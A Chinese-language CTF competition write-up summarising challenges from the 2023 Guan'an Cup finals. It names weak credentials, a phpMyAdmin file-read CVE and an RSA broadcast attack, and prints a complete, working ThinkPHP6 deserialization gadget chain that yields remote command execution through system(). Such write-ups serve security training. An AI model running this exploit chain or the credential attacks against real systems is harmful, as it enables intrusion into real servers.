# 2023 观安杯决赛

## 来源
- 原文：ctfiot.com/133165.html
- 团队：江苏金盾

## 比赛模式
- AWDP 模式（应急响应 + 攻防）
- 4 台靶机：2 web + 2 pwn
- 3 小时

## web1：phpMyAdmin 任意文件读
- `database.php` 弱口令 `ctf:ctf`
- SQL 改密：`UPDATE ctf SET pass='' where user_id=1`
- 登录 admin/pma 后台
- 利用 **CVE-2018-12613** 任意文件读拿 /flag
- admin 弱口令爆破出来打其他队伍

## web2：ThinkPHP6 反序列化 RCE

### 命令注入点
```php
$command = "python3 /var/www/app/encrypted.py '$serializedData'";
$encryptedData_modulus = shell_exec($command);
```

### encrypted.py
```python
EeEeEeEeEe = 23
def ToEncrypt_Encrypting_Encrypted(e, data):
    PpPpPpPp = libnum.generate_prime(1024)
    QqQqQqQq = libnum.generate_prime(1024)
    Dadadata = libnum.s2n(data)
    modulus = PpPpPpPp * QqQqQqQq
    cryptedData = pow(Dadadata, EeEeEeEeEe, modulus)
    cryptedData_modulus.append({str(cryptedData): str(modulus)})
```
- 用 e=23 + 6 个不同 modulus 加密 flag（**低加密指数广播攻击**）

### 反序列化链
```php
namespace think {
    abstract class Model {
        private $lazySave = true;
        private $data = ['a' => 'b'];
        private $exists = true;
        protected $withEvent = false;
        protected $readonly = ['a'];
        protected $relationWrite;
        private $relation;
        private $origin = [];
        public function __construct($value) {
            $this->relation = ['r' => $this];
            $this->origin = ["n" => $value];
            $this->relationWrite = ['r' => ["n" => $value]];
        }
    }
    class App { protected $request; }
    class Request {
        protected $mergeParam = true;
        protected $param = ["whoami"];
        protected $filter = "system";
    }
}
namespace think\model { class Pivot extends Model {} }
namespace think\route {
    class Url {
        protected $url = "";
        protected $domain = "domain";
        protected $route;
        protected $app;
        public function __construct($route) {
            $this->route = $route;
            $this->app = new App();
        }
    }
}
namespace think\log {
    class Channel {
        protected $lazy = false;
        protected $logger;
        protected $log = [];
        public function __construct($logger) { $this->logger = $logger; }
    }
}
namespace think\session {
    class Store {
        protected $data;
        protected $serialize = ["call_user_func"];
        protected $id = "";
        public function __construct($data) { $this->data = [$data, "param"]; }
    }
}
namespace {
    $request = new think\Request();
    $store = new think\session\Store($request);
    $channel = new think\log\Channel($store);
    $url = new think\route\Url($channel);
    $model = new think\model\Pivot($url);
    echo urlencode(serialize($model));
}
```

### 触发链
- Pivot.__destruct → Url.__toString → Channel.__call → Store.save → call_user_func → system

## 关键技巧
- **AWDP 弱口令**：ctf:ctf 通用密码
- **CVE-2018-12613**：pma 任意文件读
- **ThinkPHP6 反序列化**：Model + Request(filter=system) 链
- **低指数广播攻击**：e=23 + 6 个 modulus
